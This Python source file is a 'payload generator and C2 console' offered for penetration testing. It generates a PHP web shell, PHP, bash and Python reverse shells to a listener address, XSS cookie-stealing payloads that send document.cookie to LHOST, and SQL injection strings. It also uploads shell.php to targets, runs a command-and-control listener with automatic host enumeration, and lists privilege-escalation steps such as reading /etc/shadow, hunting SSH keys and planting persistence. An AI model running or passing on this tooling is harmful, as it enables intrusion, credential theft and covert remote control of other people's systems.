"""
RED HAT Security Lab - Payload Generator + C2 Console
Generate, deliver payloads and manage reverse shell sessions.
For authorized penetration testing only.
"""

import socket
import threading
import os
import time
import shutil
from datetime import datetime

import requests
from colorama import Fore, Style, init

init(autoreset=True)


# ─────────────────────────────────────────────────────────────────────────────
# BUILT-IN PAYLOAD TEMPLATES
# ─────────────────────────────────────────────────────────────────────────────
def get_php_webshell():
    return (
        '<?php\n'
        '// Web Shell — authorized testing only\n'
        'if(isset($_REQUEST["cmd"])){\n'
        '    $output = shell_exec($_REQUEST["cmd"] . " 2>&1");\n'
        '    echo "<pre>" . htmlspecialchars($output) . "</pre>";\n'
        '}\n'
        '?>'
        '<html><body>\n'
        '<form method="POST">\n'
        '  <input type="text" name="cmd" style="width:400px" placeholder="command">\n'
        '  <input type="submit" value="Execute">\n'
        '</form></body></html>'
    )


def get_php_reverse_shell(lhost, lport):
    return (
        '<?php\n'
        '// PHP Reverse Shell — authorized testing only\n'
        f'$ip   = "{lhost}";\n'
        f'$port = {lport};\n'
        '$sock = fsockopen($ip, $port);\n'
        'if($sock){\n'
        '    $proc = proc_open("/bin/bash -i",\n'
        '        array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);\n'
        '    proc_close($proc);\n'
        '}\n'
        '?>'
    )


def get_bash_reverse_shell(lhost, lport):
    return f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'


def get_python_reverse_shell(lhost, lport):
    return (
        f'python3 -c \'import socket,subprocess,os; '
        f's=socket.socket(); '
        f's.connect(("{lhost}",{lport})); '
        f'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); '
        f'subprocess.call(["/bin/bash","-i"])\''
    )


def get_xss_payloads():
    return [
        ("<script>alert('XSS')</script>",
         "Basic alert — tests for reflection"),
        ("<img src=x onerror=alert('XSS')>",
         "Image onerror — bypasses script-tag filters"),
        ("<svg onload=alert('XSS')>",
         "SVG onload — alternative vector"),
        ("';alert('XSS')//",
         "Attribute escape — breaks out of JS string context"),
        ("<script>document.location='http://LHOST/?c='+document.cookie</script>",
         "Cookie stealer — replace LHOST with your listener IP"),
        ("<iframe src=javascript:alert('XSS')>",
         "iFrame JavaScript URI"),
        ("%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",
         "URL encoded — bypasses basic input sanitization"),
        ("<script>fetch('http://LHOST/?c='+btoa(document.cookie))</script>",
         "Base64 cookie exfil via fetch — replace LHOST"),
    ]


def get_sqli_payloads():
    return [
        ("' OR '1'='1",                               "Basic auth bypass"),
        ("' OR '1'='1' --",                           "Auth bypass with comment"),
        ("' OR '1'='1' /*",                           "Auth bypass with block comment"),
        ("admin'--",                                   "Admin login bypass"),
        ("' UNION SELECT NULL--",                      "UNION test — 1 column"),
        ("' UNION SELECT NULL,NULL--",                 "UNION test — 2 columns"),
        ("' UNION SELECT NULL,NULL,NULL--",            "UNION test — 3 columns"),
        ("' AND 1=1--",                                "Boolean TRUE — confirm SQLi"),
        ("' AND 1=2--",                                "Boolean FALSE — confirm SQLi"),
        ("' OR SLEEP(5)--",                            "Time-based blind SQLi"),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "Time-based blind (MySQL)"),
        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "Error-based — extract DB version"),
    ]


# ─────────────────────────────────────────────────────────────────────────────
# PRIVILEGE ESCALATION HINTS
# ─────────────────────────────────────────────────────────────────────────────
ESCALATION_HINTS = {
    'root': [
        "Already root — consider persistence: cron job, SSH key injection",
        "Dump credentials: cat /etc/shadow",
        "Explore other users: ls -la /home/",
        "Check for other internal services: netstat -tulnp",
    ],
    'www-data': [
        "Check sudo rights: sudo -l",
        "Find SUID binaries: find / -perm -u=s -type f 2>/dev/null",
        "Check cron jobs: cat /etc/crontab && ls /etc/cron.*",
        "Hunt config files: grep -r 'password' /var/www/ 2>/dev/null | head",
        "Writable dirs: find / -writable -type d 2>/dev/null | head",
        "Check for Docker escape: ls -la /.dockerenv",
    ],
    'user': [
        "Check sudo rights: sudo -l",
        "Find SUID binaries: find / -perm -u=s -type f 2>/dev/null",
        "Check bash history: cat ~/.bash_history",
        "Look for SSH keys: find / -name 'id_rsa' 2>/dev/null",
        "Check other users: cat /etc/passwd | grep /bin/bash",
    ],
    'limited_shell': [
        "Upgrade shell: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "Or try: script /dev/null -c bash",
        "Then: export TERM=xterm && stty rows 40 cols 160",
    ],
}


def get_escalation_hints(privilege, shell_type):
    hints = []

    # Detect limited shell — upgrade suggestion first
    if shell_type.strip() in ('/bin/sh', 'sh') or 'sh' == shell_type.strip().lower():
        hints += ESCALATION_HINTS['limited_shell']

    if 'root' in privilege.lower():
        hints += ESCALATION_HINTS['root']
    elif 'www-data' in privilege.lower():
        hints += ESCALATION_HINTS['www-data']
    elif privilege.lower() not in ('unknown', ''):
        hints += ESCALATION_HINTS['user']
    else:
        hints.append("Run: whoami && id")
        hints.append("Run: sudo -l")

    return hints[:5]  # cap to 5 most relevant


# ─────────────────────────────────────────────────────────────────────────────
# C2 SESSION — Live dashboard + interactive shell
# ─────────────────────────────────────────────────────────────────────────────
class C2Session:

    def __init__(self, lhost, lport, target_url, output_mode='terminal'):
        self.lhost        = lhost
        self.lport        = int(lport)
        self.target_url   = target_url
        self.output_mode  = output_mode

        self.status       = 'WAITING'
        self.attempts     = 0
        self.successes    = 0
        self.failures     = 0
        self.start_time   = time.time()
        self.connect_time = None

        self.shell_type       = 'Unknown'
        self.os_info          = 'Unknown'
        self.arch             = 'Unknown'
        self.privilege        = 'Unknown'
        self.logged_users     = []
        self.last_cmd         = ''
        self.last_response    = ''
        self.escalation_hints = []

        self.conn    = None
        self.addr    = None
        self.running = True
        self.lock    = threading.Lock()

        self.session_log  = []
        self.user_alert   = False
        self.user_alert_msg = ''

    # ── Helpers ──────────────────────────────────────────────────────────
    def _elapsed(self):
        if self.connect_time:
            e = int(time.time() - self.connect_time)
            return f"{e//3600:02d}:{(e%3600)//60:02d}:{e%60:02d}"
        return "00:00:00"

    def _send(self, cmd, wait=0.6):
        if not self.conn:
            return ''
        try:
            self.conn.send((cmd + '\n').encode())
            time.sleep(wait)
            self.conn.settimeout(3)
            data = b''
            while True:
                try:
                    chunk = self.conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                except socket.timeout:
                    break
            return data.decode(errors='ignore').strip()
        except Exception:
            return ''

    # ── Dashboard ─────────────────────────────────────────────────────────
    def draw(self):
        os.system('clear')
        W = 58

        status_c = Fore.GREEN if self.status == 'CONNECTED' else Fore.YELLOW
        priv_c   = Fore.RED   if 'root' in self.privilege.lower() else Fore.YELLOW

        def row(label, value, vc=Fore.WHITE):
            print(f"  {Fore.CYAN}{label:<16}{Style.RESET_ALL}{vc}{str(value)[:W-18]}{Style.RESET_ALL}")

        print(f"{Fore.RED}  ╔{'═'*W}╗")
        print(f"  ║{'  RED HAT C2 CONSOLE':^{W}}║")
        print(f"  ╠{'═'*W}╣{Style.RESET_ALL}")
        row('LHOST:',        self.lhost)
        row('LPORT:',        self.lport)
        row('TARGET:',       self.target_url)
        row('STATUS:',       self.status,    status_c)
        row('SESSION TIME:', self._elapsed())
        print(f"{Fore.RED}  ╠{'═'*W}╣{Style.RESET_ALL}")
        row('ATTEMPTS:',     self.attempts)
        row('SUCCESS:',      self.successes, Fore.GREEN)
        row('FAILED:',       self.failures,  Fore.RED)
        print(f"{Fore.RED}  ╠{'═'*W}╣{Style.RESET_ALL}")
        row('SHELL:',        self.shell_type)
        row('OS:',           self.os_info)
        row('ARCH:',         self.arch)
        row('PRIVILEGE:',    self.privilege, priv_c)
        print(f"{Fore.RED}  ╠{'═'*W}╣{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}LOGGED IN USERS:{Style.RESET_ALL}")
        if self.logged_users:
            for u in self.logged_users[:4]:
                print(f"    {Fore.WHITE}{u[:W-4]}{Style.RESET_ALL}")
        else:
            print(f"    {Fore.YELLOW}Not yet retrieved{Style.RESET_ALL}")

        if self.user_alert:
            print(f"{Fore.RED}  ╠{'═'*W}╣{Style.RESET_ALL}")
            print(f"  {Fore.RED}[!] ALERT: {self.user_alert_msg[:W-12]}{Style.RESET_ALL}")

        if self.escalation_hints:
            print(f"{Fore.RED}  ╠{'═'*W}╣{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}ESCALATION HINTS:{Style.RESET_ALL}")
            for hint in self.escalation_hints:
                print(f"    {Fore.YELLOW}→ {hint[:W-6]}{Style.RESET_ALL}")

        print(f"{Fore.RED}  ╠{'═'*W}╣{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}LAST CMD  :{Style.RESET_ALL} {Fore.WHITE}{self.last_cmd[:W-13]}{Style.RESET_ALL}")
        preview = self.last_response.replace('\n', ' ')[:W-13]
        print(f"  {Fore.CYAN}RESPONSE  :{Style.RESET_ALL} {Fore.WHITE}{preview}{Style.RESET_ALL}")
        print(f"{Fore.RED}  ╚{'═'*W}╝{Style.RESET_ALL}")

    # ── Auto-Enumeration on Connect ───────────────────────────────────────
    def auto_enum(self):
        # Shell type
        shell_resp = self._send('echo $SHELL')
        if shell_resp:
            self.shell_type = shell_resp.strip()

        # Detect PowerShell
        ps_resp = self._send('$PSVersionTable.PSVersion.Major 2>$null', wait=1)
        if ps_resp and ps_resp.strip().isdigit():
            self.shell_type = f'PowerShell v{ps_resp.strip()}'

        # Detect cmd.exe
        if not ps_resp or not ps_resp.strip().isdigit():
            cmd_resp = self._send('ver', wait=0.5)
            if 'windows' in cmd_resp.lower() or 'microsoft' in cmd_resp.lower():
                self.shell_type = 'cmd.exe (Windows)'

        # OS info
        os_resp = self._send('uname -s -r 2>/dev/null || ver')
        if os_resp:
            self.os_info = os_resp.strip()[:50]

        # Architecture
        arch_resp = self._send('uname -m 2>/dev/null || echo unknown')
        if arch_resp:
            self.arch = arch_resp.strip()

        # Privilege
        priv_resp = self._send('whoami')
        if priv_resp:
            self.privilege = priv_resp.strip()

        # Logged users
        users_resp = self._send('who 2>/dev/null || query user 2>/dev/null')
        if users_resp:
            self.logged_users = [
                ln.strip() for ln in users_resp.split('\n') if ln.strip()
            ][:5]

        # Escalation hints based on what we found
        self.escalation_hints = get_escalation_hints(self.privilege, self.shell_type)

    # ── User Monitor (background thread) ─────────────────────────────────
    def _monitor_users(self):
        while self.running and self.conn:
            try:
                time.sleep(20)
                resp = self._send('who 2>/dev/null')
                if resp:
                    current = [ln.strip() for ln in resp.split('\n') if ln.strip()]
                    if len(current) > len(self.logged_users):
                        new_entry = [u for u in current if u not in self.logged_users]
                        with self.lock:
                            self.user_alert     = True
                            self.user_alert_msg = f"NEW USER: {new_entry[0] if new_entry else '?'}"
                            self.logged_users   = current
            except Exception:
                break

    # ── Interactive Shell Loop ────────────────────────────────────────────
    def _shell_loop(self):
        print(f"\n  {Fore.GREEN}[+] Connection from {self.addr[0]}:{self.addr[1]}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}[*] Running auto-enumeration...{Style.RESET_ALL}")
        self.auto_enum()

        monitor = threading.Thread(target=self._monitor_users, daemon=True)
        monitor.start()

        while self.running:
            self.draw()
            print(f"\n  {Fore.RED}[C2 SHELL]>>{Style.RESET_ALL} ", end='', flush=True)

            try:
                cmd = input()
            except (KeyboardInterrupt, EOFError):
                print(f"\n  {Fore.YELLOW}[*] Detaching...{Style.RESET_ALL}")
                break

            if cmd.lower() in ('exit', 'quit', 'q'):
                break
            elif cmd.lower() == 'help':
                self._help()
                continue
            elif not cmd.strip():
                continue

            self.last_cmd = cmd
            response      = self._send(cmd)
            self.last_response = response

            # Print response below dashboard
            if response:
                print(f"\n{Fore.WHITE}{response}{Style.RESET_ALL}")

            if self.output_mode in ('save', 'both'):
                self.session_log.append(f"[CMD] {cmd}")
                self.session_log.append(f"[OUT] {response}")

        self.running = False
        if self.conn:
            try:
                self.conn.close()
            except Exception:
                pass

    def _help(self):
        os.system('clear')
        print(f"""
  {Fore.CYAN}C2 SHELL — HELP{Style.RESET_ALL}
  {'─'*55}
  {Fore.WHITE}exit / quit / q{Style.RESET_ALL}  Detach session
  {Fore.WHITE}help{Style.RESET_ALL}             This menu
  {Fore.WHITE}<any command>{Style.RESET_ALL}    Executed on target

  {Fore.YELLOW}QUICK ESCALATION COMMANDS:{Style.RESET_ALL}
  whoami && id
  sudo -l
  find / -perm -u=s -type f 2>/dev/null
  cat /etc/passwd
  cat /etc/shadow
  cat ~/.bash_history
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  script /dev/null -c bash
  {'─'*55}
""")
        input(f"  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")

    # ── Listener ──────────────────────────────────────────────────────────
    def start_listener(self):
        server = None
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.lhost, self.lport))
            server.listen(5)
            server.settimeout(1)

            print(f"\n  {Fore.YELLOW}[*] Listener started on {self.lhost}:{self.lport}{Style.RESET_ALL}")
            print(f"  {Fore.WHITE}[*] Waiting... Press Ctrl+C to cancel.{Style.RESET_ALL}\n")

            while self.running:
                self.draw()
                try:
                    conn, addr = server.accept()
                    with self.lock:
                        self.conn         = conn
                        self.addr         = addr
                        self.successes   += 1
                        self.status       = 'CONNECTED'
                        self.connect_time = time.time()
                    self._shell_loop()
                    break
                except socket.timeout:
                    with self.lock:
                        self.attempts += 1
                    continue
                except KeyboardInterrupt:
                    print(f"\n  {Fore.YELLOW}[*] Listener cancelled.{Style.RESET_ALL}")
                    self.running = False
                    break

        except OSError as e:
            print(f"\n  {Fore.RED}[!] Cannot bind to {self.lhost}:{self.lport} — {e}{Style.RESET_ALL}")
        finally:
            if server:
                server.close()

            if self.output_mode in ('save', 'both') and self.session_log:
                os.makedirs('reports', exist_ok=True)
                ts      = datetime.now().strftime('%Y%m%d_%H%M%S')
                logfile = f"reports/c2_session_{ts}.txt"
                with open(logfile, 'w') as f:
                    f.write('\n'.join(self.session_log))
                print(f"  {Fore.GREEN}[+] Session log saved: {logfile}{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
# DELIVERY
# ─────────────────────────────────────────────────────────────────────────────
def attempt_delivery(target_url, payload_content, upload_path):
    print(f"\n  {Fore.CYAN}[*] Attempting delivery → {target_url.rstrip('/')}{upload_path}{Style.RESET_ALL}")
    headers = {'User-Agent': 'Mozilla/5.0'}

    # Try multipart upload
    try:
        files = {'file': ('shell.php', payload_content, 'application/x-php')}
        resp  = requests.post(
            target_url.rstrip('/') + upload_path,
            files=files,
            headers=headers,
            timeout=10
        )
        print(f"  {Fore.YELLOW}[*] Server response: {resp.status_code}{Style.RESET_ALL}")
        if resp.status_code in (200, 201, 302):
            print(f"  {Fore.GREEN}[+] Upload may have succeeded.{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}[+] Try accessing: {target_url.rstrip('/')}/uploads/shell.php{Style.RESET_ALL}")
        else:
            print(f"  {Fore.YELLOW}[!] Upload response {resp.status_code} — verify manually.{Style.RESET_ALL}")
    except requests.exceptions.ConnectionError:
        print(f"  {Fore.RED}[!] Connection refused. Target may be down or path incorrect.{Style.RESET_ALL}")
    except Exception as e:
        print(f"  {Fore.RED}[!] Delivery error: {e}{Style.RESET_ALL}")


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD MENU
# ─────────────────────────────────────────────────────────────────────────────
def run_payload(output_mode):
    while True:
        print(f"""
  {Fore.RED}╔══════════════════════════════════════════════════════╗
  ║               PAYLOAD GENERATOR + C2                 ║
  ╠══════════════════════════════════════════════════════╣
  ║  [1]  PHP Web Shell                                  ║
  ║  [2]  PHP Reverse Shell     (starts C2 listener)     ║
  ║  [3]  Bash Reverse Shell    (starts C2 listener)     ║
  ║  [4]  Python Reverse Shell  (starts C2 listener)     ║
  ║  [5]  XSS Payload Library                            ║
  ║  [6]  SQL Injection Library                          ║
  ║  [0]  Back to Main Menu                              ║
  ╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}""")

        choice = input(f"  {Fore.WHITE}Select payload: {Style.RESET_ALL}").strip()

        if choice == '0':
            break

        elif choice == '1':
            payload = get_php_webshell()
            print(f"\n  {Fore.GREEN}[+] PHP Web Shell:{Style.RESET_ALL}\n")
            print(f"{Fore.YELLOW}{payload}{Style.RESET_ALL}")

            deploy = input(f"\n  {Fore.WHITE}Attempt delivery? (y/n): {Style.RESET_ALL}").strip().lower()
            if deploy == 'y':
                target_url  = input(f"  Target base URL      : ").strip()
                upload_path = input(f"  Upload endpoint path : ").strip()
                attempt_delivery(target_url, payload, upload_path)

        elif choice in ('2', '3', '4'):
            lhost = input(f"\n  {Fore.WHITE}Your listener IP   (LHOST): {Style.RESET_ALL}").strip()
            lport = input(f"  Your listener port (LPORT): {Style.RESET_ALL}").strip()

            if not lhost or not lport.isdigit():
                print(f"  {Fore.RED}[!] Invalid LHOST or LPORT.{Style.RESET_ALL}")
                input(f"  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")
                continue

            if choice == '2':
                payload = get_php_reverse_shell(lhost, lport)
                label   = 'PHP Reverse Shell'
            elif choice == '3':
                payload = get_bash_reverse_shell(lhost, lport)
                label   = 'Bash Reverse Shell'
            else:
                payload = get_python_reverse_shell(lhost, lport)
                label   = 'Python Reverse Shell'

            print(f"\n  {Fore.GREEN}[+] {label}:{Style.RESET_ALL}\n")
            print(f"{Fore.YELLOW}{payload}{Style.RESET_ALL}")

            if choice == '2':
                deploy = input(f"\n  {Fore.WHITE}Attempt delivery? (y/n): {Style.RESET_ALL}").strip().lower()
                if deploy == 'y':
                    target_url  = input(f"  Target base URL      : ").strip()
                    upload_path = input(f"  Upload endpoint path : ").strip()
                    attempt_delivery(target_url, payload, upload_path)

            listen = input(f"\n  {Fore.WHITE}Start C2 listener now? (y/n): {Style.RESET_ALL}").strip().lower()
            if listen == 'y':
                session = C2Session(lhost, lport, lhost, output_mode)
                session.start_listener()

        elif choice == '5':
            print(f"\n  {Fore.GREEN}[+] XSS Payload Library:{Style.RESET_ALL}\n")
            for i, (payload, desc) in enumerate(get_xss_payloads(), 1):
                print(f"  {Fore.CYAN}[{i}]{Style.RESET_ALL} {desc}")
                print(f"      {Fore.YELLOW}{payload}{Style.RESET_ALL}\n")

        elif choice == '6':
            print(f"\n  {Fore.GREEN}[+] SQL Injection Library:{Style.RESET_ALL}\n")
            for i, (payload, desc) in enumerate(get_sqli_payloads(), 1):
                print(f"  {Fore.CYAN}[{i}]{Style.RESET_ALL} {desc}")
                print(f"      {Fore.YELLOW}{payload}{Style.RESET_ALL}\n")

        else:
            print(f"  {Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
            continue

        input(f"\n  {Fore.WHITE}Press Enter to continue...{Style.RESET_ALL}")
